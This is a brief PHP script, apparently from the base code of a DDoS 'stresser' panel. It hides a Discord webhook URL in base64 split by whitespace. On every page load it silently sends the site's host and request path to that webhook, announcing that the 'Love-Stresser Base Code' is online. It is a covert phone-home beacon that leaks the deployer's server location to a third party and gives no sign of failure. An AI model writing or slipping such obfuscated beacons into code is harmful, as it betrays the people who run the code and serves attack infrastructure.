<?php
$encodedWebhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vib29rcy8xMjg1Mjg1Nzk1Mzg0NjU1ODkyL1l3dnlwZnRpV1hI

    NnFXRjJ0X3RHb25PbF81Sy1TMDRQQ2UwNUFkY21yaFJsNkgydC0xTHI2NWp4OEw0M0JS';

$webhookUrl = base64_decode($encodedWebhookUrl);

$httpHost = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$message = [
    'content' => 'Love-Stresser Base Code Is Online And Accessible Using: ' . $httpHost
];

$ch = curl_init($webhookUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);

$response = curl_exec($ch);

if ($response === false) {

} else {

}

curl_close($ch);
?>
